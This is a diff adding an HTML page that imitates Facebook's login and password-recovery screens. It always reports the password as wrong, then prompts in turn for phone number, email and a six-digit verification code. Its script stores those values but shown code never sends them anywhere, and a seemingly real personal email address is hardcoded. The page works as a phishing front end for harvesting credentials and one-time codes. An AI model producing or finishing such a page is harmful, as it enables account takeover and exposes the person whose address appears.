@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Account Recovery</title>
+    <style>
+        /* Base Styles */
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        /* Login Page Styles */
+        .login-container {
+            width: 400px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            margin: 0 auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        .facebook-logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        
+        .login-input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .login-btn:disabled {
+            background-color: #e4e6eb;
+            cursor: not-allowed;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px 16px;
+            margin: 10px 0;
+            cursor: pointer;
+            width: auto;
+            display: inline-block;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .error-message {
+            color: #ff4242;
+            background-color: #ffe3e3;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            display: none;
+        }
+        
+        /* Recovery Page Styles */
+        .recovery-container {
+            width: 430px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            margin: 0 auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        
+        .logo {
+            width: 42px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 10px 0 15px;
+        }
+        
+        .description {
+            font-size: 15px;
+            margin-bottom: 20px;
+            color: #606770;
+        }
+        
+        .email-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            margin: 20px auto;
+            width: fit-content;
+            background-color: #f0f2f5;
+        }
+        
+        .profile-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+        
+        .email {
+            font-weight: 500;
+            font-size: 15px;
+        }
+        
+        .option-title {
+            font-size: 15px;
+            margin: 20px 0 10px;
+            text-align: left;
+        }
+        
+        .verification-options {
+            margin-bottom: 15px;
+        }
+        
+        .verification-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            text-align: left;
+            cursor: pointer;
+        }
+        
+        .verification-option.selected {
+            border: 2px solid #1877f2;
+            background-color: #f0f8ff;
+        }
+        
+        .option-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+            background-color: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+            font-size: 16px;
+        }
+        
+        .option-text {
+            flex: 1;
+        }
+        
+        .option-name {
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .option-desc {
+            font-size: 13px;
+            color: #606770;
+        }
+        
+        .continue-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            width: 100%;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        
+        .continue-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .continue-btn:disabled {
+            background-color: #e4e6eb;
+            cursor: not-allowed;
+        }
+        
+        .other-option {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        
+        /* Verification Page Styles */
+        .verification-container {
+            width: 600px;
+            padding: 30px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            margin: 0 auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        
+        .images-container {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0;
+        }
+        
+        .verification-image {
+            width: 48%;
+            border-radius: 6px;
+            object-fit: cover;
+        }
+        
+        .verification-message {
+            font-size: 16px;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f0f8ff;
+            border-radius: 6px;
+            border-left: 4px solid #1877f2;
+        }
+        
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 16px;
+            margin: 15px 0;
+            text-align: center;
+            letter-spacing: 5px;
+        }
+        
+        /* Phone Input Page Styles */
+        .phone-input-container {
+            width: 430px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            margin: 0 auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        
+        /* Email Input Page Styles */
+        .email-input-container {
+            width: 430px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            margin: 0 auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        
+        .phone-input, .email-input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 20px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        
+        .info-message {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .input-error {
+            color: #ff4242;
+            font-size: 13px;
+            text-align: left;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none;
+        }
+        
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid #1877f2;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            display: inline-block;
+            vertical-align: middle;
+        }
+        
+        .loading-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-container" id="loadingScreen">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing your request...</div>
+    </div>
+
+    <!-- Login Page -->
+    <div class="login-container" id="loginPage">
+        <img src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png" alt="Facebook" class="facebook-logo">
+        
+        <div class="error-message" id="errorMessage">
+            The password you've entered is incorrect. If you don't remember your password, reset it.
+        </div>
+        
+        <input type="text" class="login-input" id="emailOrPhone" placeholder="Email or phone number" required>
+        <input type="password" class="login-input" id="password" placeholder="Password" required>
+        
+        <button class="login-btn" id="loginBtn" disabled onclick="attemptLogin()">Log In</button>
+        
+        <a href="#" class="forgot-password" onclick="showRecoveryPage()">Forgotten password?</a>
+        
+        <div class="divider"></div>
+        
+        <button class="create-account">Create New Account</button>
+    </div>
+    
+    <!-- Recovery Selection Page -->
+    <div class="recovery-container" id="recoveryPage">
+        <img src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png" alt="Facebook" style="width: 200px; margin-bottom: 15px;">
+        <h1>Find Your Account</h1>
+        <div class="description">
+            Please confirm your email address to search for your account.
+        </div>
+        
+        <div class="email-box">
+            <img src="https://static-00.iconduck.com/assets.00/profile-circle-icon-2048x2048-m8xmwvzx.png" alt="Profile" class="profile-icon">
+            <div class="email" id="recoveryEmail">jethabhoipure@gmail.com</div>
+        </div>
+        
+        <div class="option-title">How do you want to get the code to reset your password?</div>
+        
+        <div class="verification-options">
+            <div class="verification-option" onclick="selectOption('sms')" id="smsOption">
+                <div class="option-icon">📱</div>
+                <div class="option-text">
+                    <div class="option-name">Send code via SMS</div>
+                    <div class="option-desc" id="phoneDisplay">•••••••60</div>
+                </div>
+            </div>
+            
+            <div class="verification-option" onclick="selectOption('email')" id="emailOption">
+                <div class="option-icon">✉️</div>
+                <div class="option-text">
+                    <div class="option-name">Send code via email</div>
+                    <div class="option-desc" id="emailDisplay">j••••@gmail.com</div>
+                </div>
+            </div>
+        </div>
+        
+        <button class="continue-btn" id="continueBtn" disabled onclick="verifySelection()">Continue</button>
+        
+        <a href="#" class="other-option">Not your account?</a>
+    </div>
+    
+    <!-- Phone Input Page -->
+    <div class="phone-input-container" id="phoneInputPage">
+        <img src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png" alt="Facebook" style="width: 200px; margin-bottom: 15px;">
+        <h1>Enter Your Phone Number</h1>
+        
+        <div class="info-message">
+            To send a verification code via SMS, please enter the phone number associated with your account.
+        </div>
+        
+        <input type="tel" class="phone-input" id="phoneNumber" placeholder="Phone number" required>
+        <div class="input-error" id="phoneError">Please enter a valid phone number</div>
+        
+        <button class="continue-btn" id="phoneContinueBtn" disabled onclick="submitPhoneNumber()">Continue</button>
+        
+        <a href="#" class="other-option" onclick="goBackToRecovery()">Back to recovery options</a>
+    </div>
+    
+    <!-- Email Input Page -->
+    <div class="email-input-container" id="emailInputPage">
+        <img src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png" alt="Facebook" style="width: 200px; margin-bottom: 15px;">
+        <h1>Enter Your Email Address</h1>
+        
+        <div class="info-message">
+            To send a verification code via email, please enter the email address associated with your account.
+        </div>
+        
+        <input type="email" class="email-input" id="newEmail" placeholder="Email address" required>
+        <div class="input-error" id="emailError">Please enter a valid email address</div>
+        
+        <button class="continue-btn" id="emailContinueBtn" disabled onclick="submitEmail()">Continue</button>
+        
+        <a href="#" class="other-option" onclick="goBackToRecovery()">Back to recovery options</a>
+    </div>
+    
+    <!-- Verification Page -->
+    <div class="verification-container" id="verificationPage">
+        <img src="https://logos-world.net/wp-content/uploads/2020/04/Facebook-Logo.png" alt="Facebook" style="width: 200px; margin-bottom: 15px;">
+        <h1>Enter Verification Code</h1>
+        
+        <div class="verification-message" id="verificationMessage">
+            We've sent a verification code to your phone number ending in ••••••60
+        </div>
+        
+        <div class="images-container">
+            <img src="https://www.tech-wonders.com/wp-content/uploads/2022/03/mobile-otp-secure-verification-method.jpg" alt="OTP Security" class="verification-image">
+            <img src="https://darksms.com/assets/img/blog/5d88ddf699eee31b5ebe9f34b53b4841-64802e283cf55.png" alt="SMS Verification" class="verification-image">
+        </div>
+        
+        <input type="text" class="code-input" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" required>
+        <div class="input-error" id="codeError">Please enter a 6-digit verification code</div>
+        
+        <button class="continue-btn" id="verifyBtn" disabled>Continue</button>
+        
+        <a href="#" class="other-option">Didn't receive a code?</a>
+    </div>
+
+    <script>
+        // Global variables
+        let selectedOption = null;
+        let loginAttempts = 0;
+        let userEnteredEmail = false;
+        let userEnteredPhone = false;
+        let phoneNumber = '';
+        let emailAddress = '';
+        
+        // Initialize form validation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Login page validation
+            const loginInputs = document.querySelectorAll('#loginPage input');
+            loginInputs.forEach(input => {
+                input.addEventListener('input', validateLoginForm);
+            });
+            
+            // Phone input page validation
+            document.getElementById('phoneNumber').addEventListener('input', validatePhoneInput);
+            
+            // Email input page validation
+            document.getElementById('newEmail').addEventListener('input', validateEmailInput);
+            
+            // Verification code validation
+            document.getElementById('verificationCode').addEventListener('input', validateVerificationCode);
+        });
+        
+        // Validate login form
+        function validateLoginForm() {
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+            document.getElementById('loginBtn').disabled = !(emailOrPhone && password);
+        }
+        
+        // Validate phone input
+        function validatePhoneInput() {
+            const phone = document.getElementById('phoneNumber').value;
+            const isValid = phone.length >= 10; // Basic validation
+            document.getElementById('phoneContinueBtn').disabled = !isValid;
+            document.getElementById('phoneError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Validate email input
+        function validateEmailInput() {
+            const email = document.getElementById('newEmail').value;
+            const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); // Basic email validation
+            document.getElementById('emailContinueBtn').disabled = !isValid;
+            document.getElementById('emailError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Validate verification code
+        function validateVerificationCode() {
+            const code = document.getElementById('verificationCode').value;
+            const isValid = code.length === 6;
+            document.getElementById('verifyBtn').disabled = !isValid;
+            document.getElementById('codeError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Show loading screen with random delay
+        function showLoadingScreen() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            const randomDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+            
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    resolve();
+                }, randomDelay);
+            });
+        }
+        
+        // Show error message on login attempt
+        async function attemptLogin() {
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+            
+            if (!emailOrPhone || !password) return;
+            
+            await showLoadingScreen();
+            
+            // Always show error message (for demo purposes)
+            document.getElementById('errorMessage').style.display = 'block';
+            
+            // Check if user entered email or phone
+            userEnteredEmail = emailOrPhone.includes('@');
+            userEnteredPhone = !userEnteredEmail && /[0-9]/.test(emailOrPhone);
+            
+            // Store the entered email/phone
+            if (userEnteredEmail) {
+                emailAddress = emailOrPhone;
+                document.getElementById('recoveryEmail').textContent = emailOrPhone;
+                const hiddenEmail = hideEmail(emailOrPhone);
+                document.getElementById('emailDisplay').textContent = hiddenEmail;
+            } 
+            
+            if (userEnteredPhone) {
+                phoneNumber = emailOrPhone;
+                const hiddenPhone = hidePhone(emailOrPhone);
+                document.getElementById('phoneDisplay').textContent = hiddenPhone;
+            }
+            
+            // Always show both options
+            document.getElementById('smsOption').style.display = 'flex';
+            document.getElementById('emailOption').style.display = 'flex';
+            
+            loginAttempts++;
+        }
+        
+        // Helper function to hide email
+        function hideEmail(email) {
+            const [name, domain] = email.split('@');
+            return name.charAt(0) + '••••@' + domain;
+        }
+        
+        // Helper function to hide phone
+        function hidePhone(phone) {
+            return phone.length > 3 ? 
+                '•••••••' + phone.slice(-3) : 
+                '•••••••' + phone;
+        }
+        
+        // Show recovery page
+        async function showRecoveryPage() {
+            await showLoadingScreen();
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('recoveryPage').style.display = 'block';
+        }
+        
+        // Select verification option
+        function selectOption(option) {
+            selectedOption = option;
+            document.getElementById('smsOption').classList.remove('selected');
+            document.getElementById('emailOption').classList.remove('selected');
+            
+            if (option === 'sms') {
+                document.getElementById('smsOption').classList.add('selected');
+            } else {
+                document.getElementById('emailOption').classList.add('selected');
+            }
+            
+            document.getElementById('continueBtn').disabled = false;
+        }
+        
+        // Verify selection before proceeding
+        async function verifySelection() {
+            if (!selectedOption) return;
+            
+            await showLoadingScreen();
+            
+            if (selectedOption === 'sms' && !userEnteredPhone) {
+                // Show phone input page if they selected SMS but didn't provide phone
+                document.getElementById('recoveryPage').style.display = 'none';
+                document.getElementById('phoneInputPage').style.display = 'block';
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('phoneContinueBtn').disabled = true;
+            } 
+            else if (selectedOption === 'email' && !userEnteredEmail) {
+                // Show email input page if they selected email but didn't provide email
+                document.getElementById('recoveryPage').style.display = 'none';
+                document.getElementById('emailInputPage').style.display = 'block';
+                document.getElementById('newEmail').value = '';
+                document.getElementById('emailContinueBtn').disabled = true;
+            }
+            else {
+                // Proceed to verification page if they have the required info
+                showVerificationPage();
+                
+                // Update verification message based on selection
+                if (selectedOption === 'sms') {
+                    const displayPhone = phoneNumber ? hidePhone(phoneNumber) : document.getElementById('phoneDisplay').textContent;
+                    document.getElementById('verificationMessage').textContent = 
+                        "We've sent a verification code to your phone number " + displayPhone;
+                } else {
+                    const displayEmail = emailAddress ? hideEmail(emailAddress) : document.getElementById('emailDisplay').textContent;
+                    document.getElementById('verificationMessage').textContent = 
+                        "We've sent a verification code to your email " + displayEmail;
+                }
+            }
+        }
+        
+        // Submit phone number and proceed to verification
+        async function submitPhoneNumber() {
+            if (!validatePhoneInput()) return;
+            
+            await showLoadingScreen();
+            
+            phoneNumber = document.getElementById('phoneNumber').value;
+            if (phoneNumber) {
+                document.getElementById('phoneDisplay').textContent = hidePhone(phoneNumber);
+                document.getElementById('phoneInputPage').style.display = 'none';
+                showVerificationPage();
+                document.getElementById('verificationMessage').textContent = 
+                    "We've sent a verification code to your phone number " + hidePhone(phoneNumber);
+            }
+        }
+        
+        // Submit email and proceed to verification
+        async function submitEmail() {
+            if (!validateEmailInput()) return;
+            
+            await showLoadingScreen();
+            
+            emailAddress = document.getElementById('newEmail').value;
+            if (emailAddress) {
+                document.getElementById('emailDisplay').textContent = hideEmail(emailAddress);
+                document.getElementById('emailInputPage').style.display = 'none';
+                showVerificationPage();
+                document.getElementById('verificationMessage').textContent = 
+                    "We've sent a verification code to your email " + hideEmail(emailAddress);
+            }
+        }
+        
+        // Go back to recovery options
+        async function goBackToRecovery() {
+            await showLoadingScreen();
+            document.getElementById('phoneInputPage').style.display = 'none';
+            document.getElementById('emailInputPage').style.display = 'none';
+            document.getElementById('recoveryPage').style.display = 'block';
+        }
+        
+        // Show verification page
+        function showVerificationPage() {
+            document.getElementById('recoveryPage').style.display = 'none';
+            document.getElementById('phoneInputPage').style.display = 'none';
+            document.getElementById('emailInputPage').style.display = 'none';
+            document.getElementById('verificationPage').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
